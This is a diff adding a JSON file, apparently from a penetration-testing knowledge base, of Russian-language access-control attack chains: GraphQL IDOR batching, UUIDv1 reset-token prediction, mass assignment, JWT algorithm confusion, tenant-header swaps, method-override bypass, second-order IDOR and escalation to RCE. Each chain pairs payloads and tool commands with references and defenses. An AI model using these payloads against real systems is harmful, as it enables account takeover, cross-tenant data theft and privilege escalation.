@@ -1,0 +1,398 @@
+{
+  "domain": "Access Control",
+  "domainLabel": "Контроль доступа / IDOR",
+  "domainOrder": 1,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "IDOR через глобальные node-ID GraphQL + батчинг алиасами: слив биллинга всех арендаторов",
+      "level": "intermediate",
+      "impact": "Массовый слив счетов и платёжных PII всех арендаторов одним запросом.",
+      "why": "«Непрозрачные» base64 node-ID в GraphQL это просто замаскированный gid://app/Type/123, а алиасинг превращает одиночный IDOR в массовый слив и попутно обходит rate limit.",
+      "precondition": "GraphQL API с интерфейсом Relay node(id:) / nodes(ids:), где на резолвере нет проверки доступа к объекту.",
+      "tags": [
+        "graphql",
+        "idor",
+        "bola",
+        "cross-tenant",
+        "relay",
+        "batching"
+      ],
+      "realWorld": "Shopify HackerOne #2207248 (IDOR on GraphQL BillingDocumentDownload/BillDetails); HackerOne #2633771; GitLab #2528293.",
+      "defense": "Проверять доступ внутри каждого node-резолвера, а не только на маршруте; алертить на запросы с аномально большим числом алиасов и полей.",
+      "steps": [
+        {
+          "title": "Декодируем перехваченный глобальный ID",
+          "kind": "note",
+          "detail": "echo 'WyJCaWxsaW5nRG9jdW1lbnQiLDEyM10=' | base64 -d  ->  [\"BillingDocument\",123] / gid://app/BillingDocument/123"
+        },
+        {
+          "title": "Подтверждаем IDOR на соседнем объекте",
+          "kind": "note",
+          "detail": "Increment int to 124, re-base64, replay in Burp Repeater: query{node(id:\"<gid>\"){... on BillingDocument{pdfUrl tenant{name}}}}",
+          "success": "в ответе pdfUrl и tenant.name чужого арендатора"
+        },
+        {
+          "title": "Картируем смежные чувствительные типы",
+          "kind": "note",
+          "q": "",
+          "detail": "Introspection: query{__schema{types{name fields{name}}}}  ->  find BillDetails, Invoice, Export nodes"
+        },
+        {
+          "title": "Массовый слив через алиасы в одном запросе",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "query{a1:node(id:\"gid0\"){...F} a2:node(id:\"gid1\"){...F} ... a500:node(id:\"gid499\"){...F}}"
+        },
+        {
+          "title": "Переходим к резолверу скачивания файлов",
+          "kind": "note",
+          "q": "",
+          "detail": "Call BillingDocumentDownload(id:) / fetch the signed pdfUrl per leaked record"
+        }
+      ]
+    },
+    {
+      "title": "Sandwich-атака: предсказание UUIDv1-токена сброса для 0-click ATO",
+      "level": "advanced",
+      "impact": "Захват любого аккаунта без действий жертвы, включая админов; критично.",
+      "why": "UUIDv1-токены сброса выглядят случайными, но это timestamp плюс MAC; «зажав» запрос жертвы между двумя своими, сужаем метку времени до крошечного перебираемого окна.",
+      "precondition": "Флоу сброса, инвайта или подтверждения почты выдаёт UUID версии 1, и видны два своих токена вокруг токена жертвы.",
+      "tags": [
+        "idor",
+        "uuidv1",
+        "password-reset",
+        "account-takeover",
+        "predictable-token"
+      ],
+      "realWorld": "landh.tech '0-Click ATO with the Sandwich Attack' (2023); AppSec Labs 'Sandwich Attacks'; intruder.io guidtool.",
+      "defense": "CSPRNG-токены (UUIDv4 / secrets, 128+ бит), короткий одноразовый TTL и rate limit на выпуск сброса по аккаунту и IP.",
+      "steps": [
+        {
+          "title": "Фингерпринтим токен как UUIDv1",
+          "kind": "note",
+          "detail": "uuidtool.py <token>  ->  version nibble = 1, identical node (MAC) across requests",
+          "success": "version=1, узел (MAC) совпадает между запросами"
+        },
+        {
+          "title": "Первый ломоть: сброс своего аккаунта",
+          "kind": "note",
+          "q": "",
+          "detail": "Request a reset for your own account, record token T1 (lower time bound)"
+        },
+        {
+          "title": "Начинка: сброс для жертвы",
+          "kind": "note",
+          "q": "",
+          "detail": "POST /api/password/reset {\"email\":\"victim@target\"}  (victim token generated between yours)"
+        },
+        {
+          "title": "Второй ломоть: снова сброс своего аккаунта",
+          "kind": "note",
+          "q": "",
+          "detail": "Request your own reset again, record token T2 (upper time bound)"
+        },
+        {
+          "title": "Генерируем кандидатов в окне и перебираем confirm",
+          "kind": "note",
+          "detail": "guidtool -t T1 -r T1,T2  (or Lupin-Holmes/sandwich), then loop GET /reset?token=<candidate>"
+        }
+      ]
+    },
+    {
+      "title": "Mass assignment и инъекция вложенных объектов: эскалация роли и аренды",
+      "level": "newbie",
+      "impact": "Самоповышение до админа и/или перенос пользователя в чужую организацию (кросс-арендный контроль).",
+      "why": "Бэкенд слепо связывает всё тело JSON с ORM-моделью, поэтому один лишний ключ переписывает ваши привилегии или принадлежность к арендатору.",
+      "precondition": "Обновление профиля, регистрации или настроек (PUT/PATCH /api/users/{me}), маппящееся напрямую на сущность пользователя.",
+      "tags": [
+        "mass-assignment",
+        "idor",
+        "privilege-escalation",
+        "cross-tenant",
+        "hpp"
+      ],
+      "realWorld": "RegistrationMagic CVE-2024-1991 (auth->admin); Homakov 2012 GitHub Rails mass assignment; Cobalt 'Mass Assignment in the Wild'.",
+      "defense": "Связывать через allow-list DTO / strong params; никогда не принимать role и tenant_id из тела запроса; логировать изменение привилегированных полей.",
+      "steps": [
+        {
+          "title": "Узнаём реальные имена полей модели",
+          "kind": "checklist",
+          "q": "mass-assignment",
+          "detail": "Diff GET /api/users/me response keys vs the fields the form submits"
+        },
+        {
+          "title": "Брутим скрытые связываемые параметры",
+          "kind": "script",
+          "q": "Parameter discovery sources (gau+katana -> unfurl -> arjun)",
+          "detail": "Burp Param Miner \"Guess JSON parameters\" / ffuf the body keyspace"
+        },
+        {
+          "title": "Инъектируем привилегированные ключи в апдейт",
+          "kind": "payload",
+          "q": "Mass Assignment",
+          "detail": "Add \"role\":\"admin\" / \"isAdmin\":true / \"is_staff\":true / \"permissions\":[\"*\"]",
+          "success": "перелогин показывает role=admin / открыт админ-роут"
+        },
+        {
+          "title": "Если плоские ключи фильтруются: вложенность и HPP",
+          "kind": "payload",
+          "q": "HTTP Parameter Pollution",
+          "detail": "\"user[role]\":\"admin\", {\"organization\":{\"id\":\"<otherTenant>\"}}, duplicate role=user&role=admin"
+        },
+        {
+          "title": "Проверяем эскалацию и идём дальше",
+          "kind": "note",
+          "q": "",
+          "detail": "Re-auth, then hit an admin-only route to confirm the new privilege"
+        }
+      ]
+    },
+    {
+      "title": "Подмена role-клейма и confusion алгоритма JWT: мгновенный админ",
+      "level": "advanced",
+      "impact": "Подделка админ-токена без учётных данных, полная BFLA-эскалация по всему API.",
+      "why": "Сервер выдаёт вам тот же токен, которому доверяет; смена клейма role на admin и переподпись публичным ключом (RS256 → HS256) или alg:none превращают личность в клиентское поле.",
+      "precondition": "Приложение авторизует по клеймам JWT и либо принимает выбранный атакующим alg, либо отдаёт RSA-публичный ключ (/jwks.json, TLS-сертификат, восстановление из двух токенов).",
+      "tags": [
+        "jwt",
+        "algorithm-confusion",
+        "alg-none",
+        "privilege-escalation",
+        "kid-injection",
+        "bfla"
+      ],
+      "realWorld": "PortSwigger 'Algorithm confusion attacks'; Auth0 jsonwebtoken alg:none (CVE-2015-9235); HackTricks JWT.",
+      "defense": "Жёстко фиксировать один серверный алгоритм, отклонять alg:none, разделять ключи по назначению, валидировать kid по allow-list.",
+      "steps": [
+        {
+          "title": "Декодируем токен и находим клейм привилегий",
+          "kind": "command",
+          "q": "jwt_tool",
+          "detail": "jwt_tool <jwt>  ->  find \"role\":\"user\" / \"isAdmin\":false / \"tenant\":\"A\""
+        },
+        {
+          "title": "Сначала пробуем тривиальные обходы",
+          "kind": "payload",
+          "q": "JSON Web Token",
+          "detail": "jwt_tool <jwt> -X a  (alg:none / strip signature), or flip the claim and replay if the signature is unverified"
+        },
+        {
+          "title": "Достаём RSA-публичный ключ",
+          "kind": "note",
+          "detail": "Pull /jwks.json, or use jwt_tool rsa_sign2n to derive pubkey.pem from 2 captured tokens"
+        },
+        {
+          "title": "Форжим HS256-токен, подписанный публичным ключом",
+          "kind": "payload",
+          "q": "JSON Web Token",
+          "detail": "jwt_tool <jwt> -X k -pk pubkey.pem  with \"role\":\"admin\",\"tenant\":\"victim\"",
+          "success": "сервер принимает форжённый токен, доступ к админ-API"
+        },
+        {
+          "title": "Абьюз kid для SQLi или path traversal ключа",
+          "kind": "note",
+          "q": "",
+          "detail": "\"kid\":\"../../../dev/null\" (empty HMAC key) or kid SQLi to control the HMAC secret"
+        }
+      ]
+    },
+    {
+      "title": "Обход изоляции арендаторов подменой org_id / X-Tenant-ID / Host",
+      "level": "intermediate",
+      "impact": "Чтение и запись данных любого чужого арендатора (CRM, счета, лиды); массовая кросс-арендная утечка.",
+      "why": "Приложение корректно аутентифицирует вас, но «какой арендатор» определяет по управляемому вами заголовку, пути или полю тела, поэтому одна подмена org_id заводит к соседям.",
+      "precondition": "Мультиарендное приложение определяет арендатора по клиентскому X-Tenant-ID / Host / поддомену / org_id, а не из сессии.",
+      "tags": [
+        "multi-tenant",
+        "idor",
+        "cross-tenant",
+        "tenant-isolation",
+        "org-id",
+        "autorize"
+      ],
+      "realWorld": "'Massive Cross-Tenant Access Control Bug' (Medium, 2024); 'Multi-Tenant Authz Bypass via Host Header'; OWASP Multi-Tenant Security Cheat Sheet.",
+      "defense": "Определять арендатора строго из аутентифицированной сессии или токена; на каждый запрос добавить row-level проверку tenant_id = session.tenant.",
+      "steps": [
+        {
+          "title": "Дифаем каждый запрос в двух сессиях",
+          "kind": "script",
+          "q": "authz_matrix.py - матрица авторизации (BOLA/no-auth)",
+          "detail": "Burp Autorize using Tenant-B cookies as the comparison identity"
+        },
+        {
+          "title": "Подменяем селектор арендатора, сохраняя свою сессию",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "Change X-Tenant-ID, org_id=, /api/orgs/{otherOrg}/..., or Host: tenantB.app.com",
+          "success": "в ответе чужие данные арендатора (лиды/счета)"
+        },
+        {
+          "title": "Перебираем идентификаторы арендаторов",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w orgids.txt -H \"X-Tenant-ID: FUZZ\" -u https://app/api/data  (filter on 200/size)"
+        },
+        {
+          "title": "Подтверждаем влияние и на запись",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "Replay the swap on POST/PUT/DELETE (edit leads, delete records), not just GET"
+        },
+        {
+          "title": "Эскалируем в админ-поверхность чужого арендатора",
+          "kind": "note",
+          "q": "",
+          "detail": "POST /api/orgs/{victim}/members {\"email\":\"me\",\"role\":\"admin\"}"
+        }
+      ]
+    },
+    {
+      "title": "Confusion HTTP-метода и method-override: обход authz-мидлвара",
+      "level": "intermediate",
+      "impact": "Доступ к админ-действиям (самоповышение, чтение чужих данных), когда защищён лишь один метод.",
+      "why": "Авторизация навешена на POST /admin/..., но фреймворк всё равно роутит GET и варианты с override-заголовком в тот же обработчик, поэтому смена метода проходит мимо проверки.",
+      "precondition": "Контроль доступа навешен по методу или Content-Type (например, мидлвар только на POST), тогда как фреймворк обрабатывает альтернативные глаголы.",
+      "tags": [
+        "broken-access-control",
+        "http-verb-tampering",
+        "method-override",
+        "content-type",
+        "authz-bypass"
+      ],
+      "realWorld": "ESPv2 JWT bypass via X-HTTP-Method-Override (GHSA-6qmp-9p95-fc5f); PortSwigger 'Method-based access control'; HackerOne #775560.",
+      "defense": "Применять авторизацию в слое, не зависящем от метода; игнорировать override-заголовки без явной нужды; deny-by-default на неперечисленные глаголы.",
+      "steps": [
+        {
+          "title": "Снимаем бейзлайн защищённого вызова",
+          "kind": "note",
+          "q": "",
+          "detail": "POST /api/admin/users/promote {\"role\":\"admin\"}  ->  403 baseline"
+        },
+        {
+          "title": "Меняем HTTP-метод",
+          "kind": "payload",
+          "q": "Обход 403 / контроль доступа",
+          "detail": "Same path as GET /api/admin/users/promote?role=admin, or PUT/PATCH/HEAD",
+          "success": "ответ 200 и действие выполнено вместо 403"
+        },
+        {
+          "title": "Подсовываем method-override заголовки",
+          "kind": "payload",
+          "q": "Обход 403 / контроль доступа",
+          "detail": "POST + header X-HTTP-Method-Override: GET / X-Method-Override / body _method=PUT"
+        },
+        {
+          "title": "Меняем Content-Type против фильтров по формату",
+          "kind": "payload",
+          "q": "Обход 403 / контроль доступа",
+          "detail": "Content-Type application/json  ->  application/x-www-form-urlencoded or text/plain, same params"
+        },
+        {
+          "title": "Автоматизируем матрицу методов и заголовков",
+          "kind": "script",
+          "q": "authz_method_bypass.py - обход контроля по методу/формату",
+          "detail": "ffuf -X FUZZ over {GET,POST,PUT,PATCH,HEAD,OPTIONS} + override-header wordlist"
+        }
+      ]
+    },
+    {
+      "title": "IDOR второго порядка: пишем здесь, читаем там",
+      "level": "advanced",
+      "impact": "Слив PII других пользователей и арендаторов через вторичный путь чтения, обходящий парадную авторизацию.",
+      "why": "Вы подкладываете чужую ссылку на объект туда, где ввод проверяется, но другая фича позже разыменовывает её вообще без проверки.",
+      "precondition": "Две связанные фичи: одна сохраняет переданный вами ID, другая позже рендерит или отправляет данные по этому ID.",
+      "tags": [
+        "idor",
+        "second-order",
+        "stored-idor",
+        "export",
+        "webhook"
+      ],
+      "realWorld": "Ozgur Alp 'A Less Known Attack Vector: Second-Order IDOR Attacks'; Intigriti 'Advanced IDOR' guide.",
+      "defense": "Перепроверять доступ к объекту в момент рендера или чтения, а не только при записи; не считать сохранённый ID заранее валидированным.",
+      "steps": [
+        {
+          "title": "Ищем пару «пишем тут, читаем там»",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "Saved templates, \"share\", scheduled report, audit/activity feed, webhook target"
+        },
+        {
+          "title": "Подкладываем ID объекта жертвы в поле записи",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "POST /reports {\"data_source_id\":<victimId>}  (write-side only checks you own the report)"
+        },
+        {
+          "title": "Триггерим вторичный путь чтения",
+          "kind": "note",
+          "q": "",
+          "detail": "Run the export / open the activity log / fire the webhook that resolves data_source_id server-side"
+        },
+        {
+          "title": "Собираем утёкшие данные из второго канала",
+          "kind": "note",
+          "q": "",
+          "detail": "Read the generated PDF/CSV or the webhook callback now containing victim PII",
+          "success": "в PDF/CSV или webhook-колбэке видна PII жертвы"
+        },
+        {
+          "title": "Масштабируем по диапазону ID",
+          "kind": "script",
+          "q": "idor_seq.py - перебор последовательных ID (threaded)",
+          "detail": "Loop the plant-then-trigger over sequential victim IDs"
+        }
+      ]
+    },
+    {
+      "title": "Последовательный IDOR → подмена isAdmin на клиенте → полный админ → RCE",
+      "level": "intermediate",
+      "impact": "От одного +1 к ID до тысяч записей клиентов, общей админки и RCE через загрузку файлов/SSTI; полная компрометация платформы.",
+      "why": "Скучный IDOR по последовательным ID на дашборде становится катастрофой, как только замечаешь, что в ответе логина едет isadmin:false, который проверяет только клиент.",
+      "precondition": "Последовательные ID объектов, флаг админа возвращается клиенту и принимается от него на доверии, а в админке есть функции контента или загрузки файлов.",
+      "tags": [
+        "idor",
+        "privilege-escalation",
+        "client-side-trust",
+        "forced-browsing",
+        "ssti",
+        "rce"
+      ],
+      "realWorld": "Eaton Zveare 'Compromising Honda's eCommerce dealer platform' (eaton-works.com, 2023); HackerOne Atavist #950881 (IDOR email change -> ATO).",
+      "defense": "Никогда не доверять возвращённым клиенту role / isadmin; применять серверный RBAC на каждый админ-маршрут; закрывать загрузку файлов и шаблонов в админке.",
+      "steps": [
+        {
+          "title": "Обходим последовательные ID (горизонтальный IDOR)",
+          "kind": "note",
+          "detail": "siteId=1004 then +1 reveals another dealer's dashboard and orders"
+        },
+        {
+          "title": "Подменяем флаг админа в ответе авторизации",
+          "kind": "payload",
+          "q": "Business Logic Errors",
+          "detail": "Burp Match&Replace \"isadmin\":false  ->  \"isadmin\":true  (or the local role cookie / JS state)",
+          "success": "разблокированы пункты меню /admin"
+        },
+        {
+          "title": "Форс-браузим открывшиеся админ-маршруты",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -w admin-paths.txt -u https://app/admin/FUZZ  ->  /admin/users, /admin/network"
+        },
+        {
+          "title": "Массово экспортируем PII всех арендаторов",
+          "kind": "note",
+          "q": "",
+          "detail": "Admin \"export orders\" pulls all dealers' customer records across years"
+        },
+        {
+          "title": "Превращаем админа в исполнение кода",
+          "kind": "note",
+          "q": "",
+          "detail": "Admin template editor  ->  SSTI, or admin file/theme upload  ->  webshell  ->  RCE"
+        }
+      ]
+    }
+  ]
+}
